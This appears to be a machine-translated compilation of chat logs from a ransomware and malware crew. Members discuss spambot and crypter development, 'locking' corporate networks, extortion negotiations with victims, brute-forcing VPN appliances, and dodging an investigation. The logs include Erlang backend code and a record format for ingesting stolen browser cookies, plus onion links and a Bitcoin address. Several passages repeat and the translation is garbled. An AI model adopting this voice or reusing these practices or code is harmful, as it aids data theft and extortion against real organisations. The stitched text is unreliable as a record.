\nelon@q3mcco35auwcstmt.onion: Greetings. The spambot has been tested. Ready to issue the assembly as a dll. You only need two things:\n1) you need to find out for which bot dll, i.e. what entry point to make there (with what it will be launched)\n2) you need a server, the previous one is not paid for (or I see the wrong version), in general, you need to order it again, we can order and deploy, but confirmation is needed\nFor exe it's almost all the same. But for dll - you need to know how to make the entry points in the dll correctly
What bot can you test with? Bq? Or trickboat?

Hey\nlooking for me?
Both are logical.
I will not do .
and new fields were added to the 90 team
you already changed base on the worker? I can merge a dump?
fields will not be saved if there are more of them?
dlls, programs, services I also added
ah, ok
Until I rolled it, I'll do it
There, a field for desktop labels is still needed, but has not yet been added to the migration.
And in the back it also seems to be absent
add everything at once so that I don't come back
Until I can. Toward evening, the time will appear.\nThere you need to add this field in other parts, so I can\u2019t do it quickly.
On 2 fields in cookies rolled migrations.
there is such a question. Because of what it may be that I make a request, the back answers me /1/ but there is no request in the logs of the info level, while the database that I transferred is also not in the database.\nIt is written in the back that /1/ is always about the answer 200, but I noticed that it answers /1/ both if the bot is in the database and if it is not.
good question, but there is no zulas in the conf already
so repeat this question when it appears
Okay, there is no story here..
nope
in order not to constantly log into the conf after relogin, there is an asterisk at the top, press 2 times and select autologin - always
then when the conf is not relevant remove the asterisk
what are the professional affairs
he is not happy
post a list of his projects
otherwise he is not emotional
that nothing is done

<mango> about black - it must be indicated that this is a dolbaeb who somehow fixed the public open source cryptor under our supervision and began to earn something there on the side, although the development should be done only for us\n[23:55:29] *** Your message was not sent. Either end your private conversation, or restart it.\n[23:55:29] <mango> and to fuck with such cocksuckers - you can add that we will give him this mower for food so that he does not die of hunger, because he himself is unlikely to earn something
epta goodwill gesture for the stupid and the poor
Let this whole forum discuss
Such fuckers only develop a calculator, they are not enough for more
can you add this as a quote from the boss
Bro again, we have some kind of misunderstanding with hackers
I ask how are you
yes like this and like this
1 mesh loknuli negotiating
I mean one thing
2 unsubscribed ... 3 loknut you said
i messed up..
this is me with Hors
I'm having a conversation
in the chat he is there Monkey
no says i messed up
1 grid 1 lok
but another team leader told me that they locked at least 2
Here ububar writes\n4:38PM\nacesalfred.com_Tom PAGGLLC.int_tom\nthese are 2 targets of yesterday
who are locking
aa\ni just remember 3\nbut if 4\nmeans 4\nhere he writes
decoy himself wrote in the general chat that I have 3 locks
now stuck on 1

hello, what kind of TK do you send to fullstacks? pliz came to me.
fields will not be saved if there are more of them?
dlls, programs, services I also added
ah, ok
Until I rolled it, I'll do it
There, a field for desktop shortcuts is still needed, but has not yet been added to the migration.
And in the back it also seems to be absent
add everything at once so that I don't come back
Until I can. Toward evening, the time will appear.\nThere you need to add this field in other parts, so I can\u2019t do it quickly.

there is such a question. Because of what it may be that I make a request, the back answers me /1/ but there is no request in the logs of the info level, while the database that I transferred is also not in the database.\nIt is written in the back that /1/ is always about the answer 200, but I noticed that it answers /1/ both if the bot is in the database and if it is not.
good question, but there is no zulas in the conf already
so repeat this question when it appears
Okay, there is no story here.
nope
in order not to constantly log into the conf after relogin, there is an asterisk at the top, press 2 times and select autologin - always
then when the conf is not relevant remove the asterisk

Unfortunately we can't.\nIf this server will be the same story, I'll write

hello, I have silence on them and no one skipped
then who are you looking for?
<mango> about black - it must be indicated that this is a dolbaeb who somehow fixed the public open source cryptor under our supervision and began to earn something there on the side, although the development should be done only for us\n[23:55:29] *** Your message was not sent. Either end your private conversation, or restart it.\n[23:55:29] <mango> and to fuck with such cocksuckers - you can add that we will give him this mower for food so that he does not die of hunger, because he himself is unlikely to earn something
epta goodwill gesture for the stupid and the poor
Let this whole forum discuss
Such fuckers only develop a calculator, they are not enough for more
can you add this as a quote from the boss

Hey
8:29 AM This is me writing\n\nGood day. What's the deal? Should I ship today or not? Software tested WG now should not be ... only grids\n\n8:29 AM This is the answer\nBetter not\nKind\nEveryone has a lot of work
hello, tom asked for more data on bluehost.com, we are preparing
according to cpanel, he worked everything, there turned out to be a lot of duplicates, a lot, so I gave him everything
that's what happened to him accs 531 / domains 53
complains that there is no one to work out the nets, there are not enough hands
Bro hello
nothing has changed for the better
please give me some report
2-3-4-5 days
no shit
added to 5 chats
although I know that there are much more grids in my work ...
Everyone says we are busy
we are we are
i feel like a beggar .. give information .... give information
fuck everyone
grids that are not marked in any way that in work or not in work I will sell
5 won't touch
that hang on me
I will continue working with you then ... when we figure out how we can work transparently.
I have no doubt that there is no deceit on your part and on the part of your team.
but there is definitely a raspy attitude to work on the part of hackers.
I ask how you are ... oh the mesh fell off
think grid on 41kkk
and what you can\u2019t restore from a fix
oh xs
give me access
and so everything
net on the net fuck it .. no
well fuck off
who else will give bots
those are not quality but quantity
I can\u2019t work like that for me, every bot is worth its weight in gold
here?

good afternoon, I'm working on the design of the messenger, now I'll send the guys the final result and we'll move on to the next sections) the idea is interesting in my opinion - paid \"likes\". that is, in the news / articles section, people write posts, respectively, you can comment on the post, or like it. Like, let's say, it will be in the form of a coin, and by clicking on it, a dollar is automatically debited from your balance, let's say) in this way, the likes will be honest, and the person who wrote it is pleasant) such as an element of friendliness and adequacy in the world of Internet freaks :D
hello get in touch
tried sms-service-online.com, similar picture
yeah accepted
and who gave the task to the messenger?
Hey! There is nothing new. Cryptocurrency. The load is large, although the build machine helps out, but the cleanings, of course, remained.\nThey seem to be satisfied with my work, I constantly make sure that I quickly respond to the comments of testers.\nThere was a good team of crypters. We are working.
either mango or ford, I somehow work with both of them in parallel =)
hi yes i understand
is everything ok at work? in general do you like it?
Everything is OK at work. I really like. Thanks for the opportunity to work with you!

Good afternoon. Objectively speaking, I solve problems with webinject, during our checks no problems were identified. There are problems on client machines, not all sites work, apparently due to a full certificate cache. Looking for a solution. On the search for vulnerabilities in Cisco, we are working on versions, while I have no results.

For the spam bot, I added functionality for sending outlook address book data to the server and made it cross-bit. The cross-bit version was given to the customer. For the crypter, I periodically clean it up and redid the payload encryption method. I am currently working on removing the crt libraries from the crypter code.

Hello, I'm back from vacation. Everyone there works according to their profiles, they are connected to the panel. In general, they cope, sometimes a lot of loads pass, they can clean longer. I issued Bentley stubs, he did crypts through them for some time, said that they worked well, now I will add these stubs to the panel, they will be like their profiles for all loads. I will make a bias on the profile for the trick, since they did not notice such a profile. This will reduce the load on other profiles and speed up the issuance of crypt files

I'm here
Hey
I didn't put it
scored so to speak
Hello, I understand perfectly
And which cryptors would you single out?
with whom do you communicate directly?
Hi ok
Hi excellent
contacted ford@ and viper@
What is your schedule when you are online?
is there a fixed time?
so what about solana?
wait
a couple of minutes
Hey
yes, not like with solana
I thought I already have experience
Rust itself is good for writing loaders and any malware)
because this is not C++ and it is worse to analyze it, which is automatic and which is manual
why worse? ) well, the same asm code
well, maybe it's just that the analysis tools are not written so much .. well, they will write
this is a known fact
I don't want to write malware..)
rust go nim and even c#
Sharp malware is like flying into space in BASIC .. it has a bold runtime) you don\u2019t need one
so where can i apply rast at you?
in writing malware
gave you this growth
it's all bullshit)
Google promotes it to Linus, come on dude write write the kernel on it
but he doesn\u2019t use it in any of his projects)
fucking saboteurs
google has golang
even worse shit
just fucked up
and what is not gogno?
I didn't even think that Ritchie would be so remembered
Xi
and .. so you are a retired sisnik)
I'm realist
so than then gogno grows?
low mileage
the qualities of the language itself are not even important, just as for
all the problems that I had were with an unstable and immature ecosystem
it's not ready for sale, despite the pouting
and erlang?
I know very little about him, after so many years
I think it's very effective
well ... big mileage .. but also gogno in your understanding)
no he is not
so what if you don\u2019t have any tasks to write something new?
the reason is simple
this is exotic, for which there are no specialists on the market
they are dumb
and in php for nine seventy per kilogram
By the way, the same applies to any exotic - a set of people
Well, here I am) but there are no tasks
and to growth and to
well .. it\u2019s no longer exotic compared to rast .. but something pulls me to rast
apparently because exotic
and closer to retirement, I'll figure it out with Haskell ... that's exotic-exotic
so what do we write on the earl of the new? )
I'd rather give you the task of teaching people earl
here look
I will repeat once again about the exotic
I'm recruiting people all the time, colliding with the laws of the market
and I've been in it for a long time, for a very long time
there is a desire of developers for a new interesting
and there are laws of evolution
according to the laws of evolution, well-tested solutions are in demand, run in time, from which everything superfluous has fallen off
like a wheel or a cobol
new exotics come and go, just like biological species
the one who proves himself, he remains on the market
Cobol is in demand - that's why it's full of legacy in banks) and bearded bespectacled men rule there .. I will be like that in 30 years)
exactly the same situation with erlang
like with cobol
in terms of training - you can train, but it's expensive. in fact, I train my competitors for myself)
no .. earl is more alive than all the living) ..\nwell, if it's hipster, then it's an elixir)
he walked well at his age, but now there is no one on the market for him and he is legacy
for example, node.js - it arose, it proved itself, it is on a par with php now
such things
the same dull g .. tell me the node can parallelize? .. yes, in general, jabascript is such a bastard) unsupported
what one wrote - the second horseradish will be able to support)
no one cares what the language can do
only cares about where to take a man on it
if there is a resume on them, then it\u2019s good
if not, then the language will not be claimed
well, it doesn\u2019t matter --- if you pick up nails with a microscope, then you won\u2019t get far
hye
yo
a ce ti ni komy ne govoil?
man
And which cryptors would you single out?
Hello, I understand perfectly
with whom do you communicate directly?
moreover, it is better to take a very bad language, in which very cheap specialists, than a very good one and with a small number of specialists
I agree with you) .. but if you talk like that. then only SI would be more alive than all the living
I'm telling you the real logic that guides me and everyone who recruits people
Yes, I understand ) ..
of course, you can write sites on the node), but you need to file a normal service ... here you need to approach responsibly
so what about the elixir? it's the same erlang
Hi excellent
contacted ford@ and viper@
What is your schedule when you are online?
is there a fixed time?
that I don't know anything about him
weird.. he's more hyped now than earl
the same earl only on the side .. read it)
modern type
Hey
so with the growth then --- gogno is not necessary? )
yes i said
he is good as exotic in malvari
malvari is not for me .. where can we find more intersection points for each other ?
why do you think your backend is used?
collecting some data .. but I'm not interested
I do not write a client. so technically my hands are white)
https://privatlab.com/s/v/3Qn2ErZ42oHzB9rLoY9l
Aw`;6?9`w:@2
updated messenger screens with a payment window)
I'll leave, I'll think
so you don't want to get your hands dirty)
here is a question
how are you with DBMS?
standard ) whine .. all sorts of storage not very . that's not mine
I think that the database should not contain business logic
I need a subd specialist
and in different, in many, with good experience
to pick parameters everyones?
No
bigdata

Hello. How are you?\nwhat are your results?\nWhat are the tasks?\nWhat ideas do you have that can be added and improved?
Is there anyone among us who considers himself a guru of blockchain and trends. Who knows where to go in this direction and what to develop ... What ideas does anyone have
1) we want to create our own crypto system by type:\netherium, polkadot and binance smart chain, etc.\n\n2) Does anyone know more about this?\n\n3) Study these above system, code, principles of work. To build our own, where it will already be possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So that others can already create their own coins, exchanges and projects on our system.
Tell us how you are doing, what successes anyone has, maybe there are some ideas?
Hello, about the blockchain - I did a bit
In short, there is a blockchain with an issuer. Without mining, it can roll in for the turnover of various obligations, such as square meters of the developer, etc.

Hello, about the blockchain - I did a bit
In short, there is a blockchain with an issuer. Without mining, it can roll in for the turnover of various obligations, such as square meters of the developer, etc.
Or such an application - there is a city, it has taxes and budget spending, but, for example, there is no money. The city pays state employees city obligations in tokens. Then he collects them from the business in tax. A business can get them from a state employee and exchange them for all sorts of goodies.

Hey Ya
neg do not turn on what the toad lags
can you see the messages?
yes I see
rejects
unsubscribed there yours, I charged them 2kk
dataxport
which
yes ok
want to pay?
or just for now?
they just wrote
even after the lock right now the auction will be
)
bargain)
to the big side)
they are insured
from cyber risks
so we are waiting
but
that is, there will be auctions with the insurance company?
No
that's not how it works
they have a budget to cover
we just pick it up and that's it
f
but
well I xs what is there)
wait all right
And How
right now they will ask for decryption
test
then a list of the date that we stole
and then we will come to a common opinion
how much money they owe us
)))
all right just waiting
understood)
is the second one still in the works?
Or is everything with him?
Or maybe it's something that shouldn't be?
it will be possible to put the date up for auction there
just keep your fingers crossed and wait
now time will tell
just waiting

should they enter into dialogue?
they've already started talking
we wait
I just made demands
understood
and said how many leaked dates
right now we have to give files for test decryption and ask for a list of what we stole
understood
keep up to date
that's how they ask it, I'll tell you
what is the mood on payments
most likely there is a recovery
communicates
with us and not themselves
[ERROR: This message is encrypted, and you are unable to decrypt it.]
well, yes
and the fact that they got in touch is already good
[ERROR: This message is encrypted, and you are unable to decrypt it.]
ans had a case when the recovery turned out to be familiar
we worked with him on 1 of the cases
[Error: The message is encrypted and cannot be decrypted.]
so the issue was resolved in 2 days
[ERROR: This message is encrypted, and you are unable to decrypt it.]
2.5kk taken
10 percent of the recovery was given
he dressed them up
hahaha
well, yes
so cool

Hello. How are you?\nwhat are your results?\nWhat are the tasks?\nWhat ideas do you have that can be added and improved?
Is there anyone among us who considers himself a guru of blockchain and trends. Who knows where to go in this direction and what to develop ... What ideas does anyone have
1) we want to create our own crypto system by type:\netherium, polkadot and binance smart chain, etc.\n\n2) Does anyone know more about this?\n\n3) Study these above system, code, principles of work. To build our own, where it will already be possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So that others can already create their own coins, exchanges and projects on our system.
Tell us how you are doing, what successes anyone has, maybe there are some ideas?

just don't ask why..
)
need to look at the logs
is there something
to see the logs you need access
and everyone sends to each other
and I still don't have access.
what does def say?
he manages access.
and you're brand new?
yes i am the second backender
def told you to text
and the backender -- think of me as a replacement ? do you manage erlang?
uh probably no

I work with the driver
in short, if it comes to processing 84 commands .. then forbidden can only be here:\n\n  read_length, 64000,\n read_timeout, 50000\n]) of\n  ok, KV, Req00  ->  KV, Req00 ;\n  undefined, Req00  ->\n  throw(reply(forbidden, Req00))
it means that either your request body is large. or shipping time is too long
request flies quickly

you need to look in the logs, it will be more specific
there may be several places
either some execution error .. or wrong format in CSV
Look at it. Driver says he was able to send normally. Perhaps it depends on which server the gasket points to or something else
do you have 8 columns in csv ?
did I calculate correctly?
The old request was thrown off, but in the new one there are 10 fields and the same error comes up.\n\nNew format:\n<b64(Username)>|<Browser>|<b64(Domain)|<b64(Cookie_name)>|<b64(Cookie_value)>|\n        <Created,unix,Sec>|<Expires,unix,Sec>|<b64(Path)>|<IsSecure>|<IsHttpOnly>

There is no other ?
sec
the admin says through the gasket goes to this server, everything is fine
it's kinda weird there.
I found it by URL .. then I cleaned the log .. I made a request again. not found by URL
need to restart the service
he does not write logs after deleting files
or how
writes
and when it was in the log .. there was an error either again
which works with POST data
something is waiting for one. and something else inside
in general, I sat down and updated everything to the latest version. it would be easier later .. but it will be done later

Yeah, come on
Hello.\n\nI got sick. Covid.\nI got sick last Tuesday.\nUntil Friday, I worked with the temperature - everyone needs crypts.\nBut there are no more forces. Sorry, but I'm not an employee yet.\nThe analysis came back positive. And this morning, the sense of smell completely disappeared.\nI am writing off to you, because xs what will happen to me by Monday.\nI will be able - I will write on Monday what and how.\nKindly write to Franz and Bentley. Collin still needs to be informed. Thanks.
pancake and vpny you don't do right?
Vpny?
Yes
Sitric pulses, etc.
Do you have an input when the case is issued with access to vpn?
Yes
it\u2019s just that someone does it, and someone doesn\u2019t, purely by bots
right now there is a pack of vpnov
I don't see a problem with working with vpns
well, who gets up early in the morning - he gives nets to the boys :-D

Hey
again the server did not extend one

what is the problem?
can you upload more on sms-activate.ru?
here I observe this, since the country of the phone should be the same as that of the ip, and since our server is state-owned, on sms-activate.ru the exhaust for the states is somehow small, so I\u2019m thinking - why not put, say, nordvpn there and try different countries, according to the maximum exhaust we will increase the soaps of this country, huh?

hello .. I don't know what to edit there. your guys are changing clients. something doesn\u2019t work for them .. but I have to figure it out and fix something myself. don't you find something wrong? It worked ok for 5 years, and then \"it broke on my side\" ...

hai
well, there is a different number of fields
need to fix the db i understand
he can't convert
so i ruled
well, the error on the request remains the same
just for parsing fields
Mismatch parameters count!
I looked at the code what is in the git
it matches
what do you mean ?
case binary:split(Row, <<\"|\">>, [ global ]) of\n[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ] ->\nSQL = \"INSERT INTO data84 (created_at, \\\"group\\\", id_low, id_high, username, browser, \\\"domain\\\", cookie_name, cookie_value, created, expires, path ) VALUES ( NOW(), $1, $2, $3 , $4, $5, $6, $7, $8, $9, $10, $11, $12, $13 )\",\nok, _  = db:equery(SQL, [ Group, IdLow, IdHigh, base64:decode(Username), Browser, base64:decode(Domain), base64:decode(Cookie_name), base64:decode(Cookie_value), Created , Expires, base64:decode(Path), binary_to_integer(Secure), binary_to_integer(HttpOnly) ]);\nAny ->\nlager:warning(\"Bad format of CSV row: ~p\", [ Any ]),\nthrow(reply(missing_parameters, Req2))\nend
here is the error
Yes, it is clear what is there .. well, there you see it writes to the log.
I think I understand what the hell is
[ Username, Browser, Domain, Cookie_name, Cookie_value, Created, Expires, Path, Secure, HttpOnly ]\nshit in this. he cannot match what came with what he needed ..\nsomething else comes. than 10 columns
less comes
and this needs to be added to the bot
to empty fields like || sawed
So?
and there any exception causes a 403 error
even if it's half normal
well, the number of columns should be 10
if in the general request, there will be at least one error, will it return 403?
I understood correctly
what do you mean by error?
well, the execution will complete
processing
well, any ekzepshn completes of course
throw(reply(missing_parameters, Req2))
Yes ..
everything is clear now
error is not here
I watch you become an Erlanger)
so what to do
I was generally promised php))))
syntactician of course uhs, well, like a python)
so what's next in your investigation?
syntax is great
well i like it better
in short, you need to insert a check for empty fields into the software, what if there is no field so that he just writes a slash
but didn't miss
in any situation, you need to look at the logs
as in the request that they gave me
to your software?
No
Who is sending this data?
well, apparently. 10 columns must have
and in the request they send either 6 or 10, then another lope and half is correct
[21:18:40] <mango> there are people with grids from 5 to 9k - will you take it?
but I didn\u2019t look that it falls in any case, and not just skips data
well, in short, the baratins themselves
pinocchio
Yes
well, you can skip the data
but will it help?
better standardize
but bad requests, of course, should just be ignored
and not fall into an eksepshen
Well, in fact, this is an ignore
to the client the answer is that fuck you)
well, part of the data is valid
okay, I will discuss there tomorrow with them how and what is best
if anything, just remove the expansion and that's it
leave the current error in the log
well, that means I can process all the data .. just CSV assumes that the number of columns is the same for all data
well they have to guarantee it

that is, here we have a news feed, in it, in fact, the same posts - one by one. do you propose to divide it into separate tabs, under one tab there will be news of services, in the other - all the rest on any topics by tags? or how do you imagine it?) I don\u2019t quite understand the pancake, I can\u2019t imagine the overall picture. type in my concept - just news, everything is a tape, on various topics that the user chooses for himself. and how do you propose to do it?) once again you can try to express your ideas a little differently so that I understand for sure))

Hey
By the way, there it seems, Adam said that something was wrong with Dedik. Before that, I made a couple of boby dedics, but they were under Linux, and everything was according to the manual from rocco. Yours was under Windows - I did everything by analogy. Basically the same, only one difference - VeraCrypt instead of LUKS for the container. What other flaws were there?

you see here the module did not put a newline before dXNlcg==|IE
the encoder of the module is on vacation but it is necessary to receive data now
so we decided to do it on the server side for now, that is, in dero
1. take the value in the first line up to the first separator | - this will be my username dXNlcg==\n2. Next, replace all occurrences of |dXNlcg== with |<line feed>dXNlcg==

hello, regarding the check - it did not work out for me to collect. On a virtual machine on which microsoft build tools 2019 is installed, the project is not going through cmake - errors, WIL is missing and something else
it is clear that the applicant understands the topic

so far yes

you see here the module did not put a newline before dXNlcg==|IE
the encoder of the module is on vacation, but it is necessary to receive data now
so we decided to do it on the server side for now, that is, in dero
1. take the value in the first line up to the first separator | - this will be my username dXNlcg==\n2. Next, replace all occurrences of |dXNlcg== with |<newline>dXNlcg==
and further processing
Hey
until lights out
here is a task
module encoder released
where does the coder of the module ... that one person only works with the language in which the module is written?

Hello. How are you?\nwhat are your results?\nWhat are the tasks?\nWhat ideas do you have that can be added and improved?
Is there anyone among us who considers himself a guru of blockchain and trends. Who knows where to go in this direction and what to develop ... What ideas does anyone have
1) we want to create our own crypto system according to the type:\netherium, polkadot and binance smart chain, etc.\n\n2) Does anyone know more about this?\n\n3) Study these above system, code, principles of work. To build our own, where it will already be possible to stick NFT, DEFI, DEX and all the new trends that are and will be. So that others can already create their own coins, exchanges and projects on our system.
Tell us how you are doing, what successes anyone has, maybe there are some ideas?

Hey
Hey
I want to clarify something
We have a VM farm\nShe has about 20 cars with the name hof\nPlease tell me you still need them. If not, I will delete
what kind of cars?
yes, 20 more
I don't remember that I used so much
win10-64 all. Made by a group called \"Hof group\
I haven't seen them used in a long time. Here I wrote to clarify
delete, I do not remember that I used them
OK, thank you
\n\nhi, yesterday francis said that due to a complaint my salary is in question now and you need to write. last week frank asked to renew two of his test servers, they were not in the renewal, because in August he said \"..we'll see..\" about them, I don't remember exactly. I paid for these servers and they were turned on after 10 minutes, everything is ok. it seems like the defender wrote to me the next day that frank complained about me and in general these servers are important. I explained the situation to him too, the defender himself told me about their importance for the first time, agreed that I would extend and ask customers about the extension when ordering, there were no showdowns, there was no more dialogue with Frank except for the extension, only he, apparently, also wrote to Francis who sent me to you. Before that, there were situations too, but I took measures, I did an inventory for a month, demolished the system, updated all the lists, there are no problems. Frank's servers are my responsibility, I had to contact him myself, but I did not think that they were needed at all
Hey\nthanks

Hello, I am writing to you off. Our old case was resumed, the investigator said why it was resumed, the Americans officially requested information about Russian hackers, not only about us, but in general who was caught in the country. Actually, they are interested in the trickbot, and some other viruses.\nOn the following Tuesday, the investigator called us for a conversation, but for the time being, like as witnesses. But for now we will be at 51.\nEven as the investigator said, the case was extended until the end of October in order to have a conversation with us. Since if the case is suspended, they cannot interrogate us in any way, and, as a matter of fact, because of this, they resumed it. We have already contacted our lawyers.\n\nQuestion: Would it be possible to get a salary? What would I do to extend my lawyer right now and go on vacation until the end of October? To destroy all this bullshit. The only thing I will go to issuing routers every day. I give them to thunder and defu.

\n\nhi, yesterday francis said that due to a complaint my salary is in question now and you need to write. last week frank asked to renew two of his test servers, they were not in the renewal, because in August he said \"..we'll see..\" about them, I don't remember exactly. I paid for these servers and they were turned on after 10 minutes, everything is ok. it seems like the defender wrote to me the next day that frank complained about me and in general these servers are important. I explained the situation to him too, the defender himself told me about their importance for the first time, agreed that I would extend and ask customers about the extension when ordering, there were no showdowns, there was no more dialogue with Frank except for the extension, only he, apparently, also wrote to Francis who sent me to you. Before that, there were situations too, but I took measures, I did an inventory for a month, demolished the system, updated the lists of everything, there are no problems. Frank's servers are my responsibility, I had to contact him myself, but I did not think that they were needed at all
Hello, I am writing to you off. Our old case was resumed, the investigator said why it was resumed, the Americans officially requested information about Russian hackers, not only about us, but in general who was caught in the country. Actually, they are interested in the trickbot, and some other viruses.\nOn the following Tuesday, the investigator called us for a conversation, but for the time being, like as witnesses. But for now we will be at 51.\nEven as the investigator said, the case was extended until the end of October in order to have a conversation with us. Since if the case is suspended, they cannot interrogate us in any way, and, as a matter of fact, because of this, they resumed it. We have already contacted our lawyers.\n\nQuestion: Would it be possible to get a salary? What would I do to extend my lawyer right now and go on vacation until the end of October? To destroy all this bullshit. The only thing I will go to issuing routers every day. I give them to thunder and defu.

I fell for you, here the problems are just family, I sort of sort it out. I will make the result for people. We also fixed the chat, I will actively take care of people.\nJust no offense, if anything, I'm sorry. Can you please send the second part of the sn if it's not difficult? I just want to pay off the loan.\nAs the stern will be, I will write to him that you threw off the salary, but how would you be against it. We communicate well with him. No matter how the first day we are already working\n\n\nBoss, well, you yourself breed this garbage, you feel sorry for everyone, but they get used to it and sit on their necks. It is necessary that you be online more often and in some situations, FOR EDUCATIONAL PURPOSES, be harder.\n\nAnd it turns out that we are playing bad / good cop here, I\u2019m fussing around here, fucking their brains so that everyone works, I swear when I see that there is no result, and then you come and feel sorry for all of them, warm, although there is no result from them . Everyone will get used to the fact that you can cry to Stern and he will forgive, give money. I will not teach you, you yourself know everything, just reminded once again.

so there are no attempts in the log
nothing at all
can there be bots with 61 teams?
although below it says that the start is successful
xs shorter
need to figure it out
they are going to load there
[Error: The message is encrypted and cannot be decrypted.]
it's most likely honey
look at the system
Microsoft Windows 7 Professional
normal helmets
Windows 7 x64 SP1
perhaps, but they write that almost from no one at all
knock on the driver, he will send you the ID who sent it
according to the import logs, he is looking right now
he threw me
you mean no data?
from any module?
well, yes

Lov writes that he does not come from these honeys

wonder how?
What kind of data is obtained?
don't forget the socks! found half-dead, while the prod is encrypted
[Error: The message is encrypted and cannot be decrypted.]
socks are being made
run your test cases check sending data from modules
https://dnog7cgicmkrvugrfxexo34gikjbr54sd5skxj4r42aj4tuy2hjsw6qd.onion
the fact that honey is in pink, in my opinion, for a long time mavelek made the appearance of bots there, even empty ones
I launched on 3rd
by default, in the 2nd, for example, only those who sent at least something get into the pink one

Hey\nI corrected the task code a bit there, uploaded it to the git, look too\nSuch a question do you get what you did worked?
I uploaded one admin panel to work, and I don\u2019t want to touch the second for the time being.
Hey
Finally finished the second cookie format, because. there were changes, see if everything works for you
+= means a = a + b; //\nYou didn't specify the field in the selection that you have in the output\nAnd here it is, there was just a giant number in the output\nIt will probably be necessary to do a test next week and understand what we have with the code, in the course of the patches ahead, the turnips have already gone ..\nI\u2019m sitting thinking how to make autotests on this all folk art, at least with my hands at least somehow .. But this is also probably later .. I\u2019ll deal with redmine and the backlog of all backlog tasks, most likely, as soon as the norms become.

Do not know. I warned you right away. I am also not funded now
Understood. We wait then. Patience, a little shaken.
And in what did it falter? We are not in a factory.
And so they paid for almost a year, but at the same time no one worked practically
Shaken in the plan, to get a job again or to wait here for work. There is no additional income. And the fact that almost a year did not work, it no longer depends on me. In turn, I am in touch and ready to immediately perform the assigned tasks.
bro here? there is an interesting building for you. fucked up kaok yinteresting. rhubarb 60kk there and a bunch of ball connected
the network is big
Well, listen, I explained the situation. Nothing depends on me
No result, stopped paying

Kusa answer)
hello
could you extend the server?
Hello. For Nicholas I made vm - I reinstalled the server Windows to the usual 10. Yeset installed. I gave him the data, there he will set it up for himself as it should
hello) how are you?
hello) how are you?
Hi, anything new?
ptu piu
control everything online
wonder if someone comes
when on earth
test
why don't you sleep
working
around the clock. I have a pen for coding.
and you?
Today on Kukon, at the time of listing, the price increased from 1.5 dollars to 6532 per coin.
fuck
how so
For 1 minute. Then went down to 2500-400-40 now 5.66
))))
something hooligans with the course)
rummage yes in the crypt?
Do you rummage around in the blockchain in general?
I track the price from the first second and can place a purchase. No risk allowed for 100 bucks. But in the worst case, you could sell 2 times more expensive.
let me give you 2k
return 4)
I read blockchain. And looked at the codes. But not a theorist.
we need people on blockchain
Have you heard about the boss's Wishlist about the social network
I am attracted to all exchanges to immediately monitor quotes, receive signals from the media and social networks and make purchases and sales.
vk for darknet))))
I would gladly become such a cheorvek
because I have a craving for crypto
I think about you all the time.
you
well, you need an understanding of how you can be useful to us, what experience do you have there in addition to the crypt, etc.
when money lies uselessly - it's bad.
large and complex project
ghbdtn
Hey
3ESoHHu87mTrFNSNUaMVEfT3vYwRYGfSHQ
there will be an exchange of its own and you can make coins for teams and a lot of other things
plz drop it when you read it
I have the experience of complete freedom of my time and spending it on programming brings me happiness.
Recently, I really fell in love with our team.
Yes, we have norms for those who work
Are you into blockchain details?
there are guys who came six months ago and already earn more than me)
depending on who is doing what
You don't envy.
I'm just glad
I raised their salaries to all of them)
Wait a little and the money will cease to exist for us.
It's just a number that you can overclock as you like.
I don't mean envy.
Well, do you believe in crypto to the fullest?
write your thoughts in the form of a report
calculation on the dark web
It\u2019s just that our team has super prospects for development
I know that the crypto is not controlled until it is converted to fiat
how do you see the topic of security for such a platform and what weaknesses will be
depending on who brings it out
and therefore it is possible to connect any number of people into work collectives
Yes
if you have any friends, pull them up too
who is fun to work with
the only place where you can overclock crypto-exchanges.
Well, you can mine.
boss said so
You can make projects and list them in tokens
it's generally brilliant, but requires org effort.
we make a social network primarily for ourselves and the community. in order to replace obsolete sites, etc., etc.
My hobby does not require anything. Just make transactions quickly.
and we will develop it as a commercial project with support, it should become like a carbon black antivirus - only for hackers)
I read the chef's everything. And Buzu too. I am for. I would like to cook in this for the rest of my life.
Here you go
Commercial project in the crypt - if it's special, it's funny
once read - take the initiative
Crypto is not a replacement but a cancellation of money.
he himself rarely offers something, but he loves someone the team cares about and someone takes the initiative
we need good team leaders who knew how to clearly set tasks, although they were friends with 3 jap
a lot of business karchoe and no one to work with))))
So initiative takes time. I'm a bot on an honest programmer. I got the texts of Dana (Van). I plunged into them now I optimize.
Well, you're just doing crypto, aren't you?
jap -- languages?
Are you talking about BK or tricks in general)
Yes
I don't do crypto, I do BK.
do you collect builds?
Not dumb, but creative.
bk weak project frankly
all adverts complain
There are constant updates from Collin. And there is real movement.
a trick, too, so far there are a lot of detectives
The theme of bots is also beautiful.
collin normas person
that would be like him to us with 10 more
It would be great
He is very normal.
if you have smart friends, bring them too
Let's collect.
with different skills for different tasks
Just don't chase me. I am your!
I don't need money
blockchain needs people
so far it's all like a pervert's fantasy, but it's all real
and the boss seems to approve of all these expenses
there, it seems, either a self-propelled gun according to the classics, or is it necessary to do Buterin on the air on smart contracts?
how did you choose?
what is closest to you in terms of blockchain and social networks?
we will take from uboutik
When there was a call - the Chief, I raised the information and scored projects for testing. Fed up and forgotten. This specificity is needed to support.
the task is to make a social network so that the login password and private key. ita hacker. and all in one site. and how beautiful everything will be on the site - we will make an application out of it. And there, in general, the functionality will not be limited
Here is the timing of trading on the stock exchange and the speed of distribution of news signals, this is specific.
supposedly there are spheres, downloaded it and you are a hacker)
Whoever found out first and shot, he removes the bank.
I'm not talking about money, again, but about a technical idea.
I understand
And the chain platform and services are awesome.
you will need to maintain the crypto-exchange then probably to the baguette
It\u2019s not clear just how they decentralize and quickly search through all distributed blocks.
It needs to be experienced and experienced.
everything is there for it
Yes, I have experience son of game bugs. Noah only in terms of knowledge.
I also have a goal and practice a powerful complex for development.
Lots of cars, lots of providers in the apartment. Monitors, memory, speed.
do you pull the nets?
I'm crazy about this.
if you really want a lot of money - all the money is in the nets
I want the algorithms themselves to communicate with others around the clock continuously.
No, I don't hack.
make grids pulses there tsiska forts
I create
their mona brute on good hardware
Once I spoofed, when the traffic was expensive and 200 bucks were stolen from me, and then I got back
and there it will fly from one grid to 2-3k and 25% of the success just for the fact that you gave access
the whole house supported me. Without knowing it
not 2-3k
all grandmas in nets bro
Osints help us do a lot of things, they took over the chats and all this is 1%. but they are also happy with the percentage) there for 5-10k they arrive from the grid
